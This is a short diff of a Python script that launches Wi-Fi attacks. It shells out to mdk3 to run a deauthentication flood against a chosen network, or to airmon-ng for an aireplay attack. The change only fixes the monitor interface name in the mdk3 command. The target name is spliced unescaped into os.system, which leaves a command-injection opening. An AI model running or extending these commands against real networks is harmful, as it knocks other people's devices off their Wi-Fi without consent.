@@ -57,7 +57,7 @@ print("")
 
 if attack == '1':
   print("############################# mdk3 attack! ###################################")
-  os.system("monitor=`cat monitor.rmo`mon && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
+  os.system("monitor=`cat monitor.rmo` && tessid=`cat tessid.rmo` && mdk3 $monitor d -n '"+target+"'")
 else:
   print("############################# Aireplay attack! ###################################")
   os.system("monitor=`cat monitor.rmo` && tchannel=`cat tchannel.rmo` && airmon-ng start $monitor $tchannel")
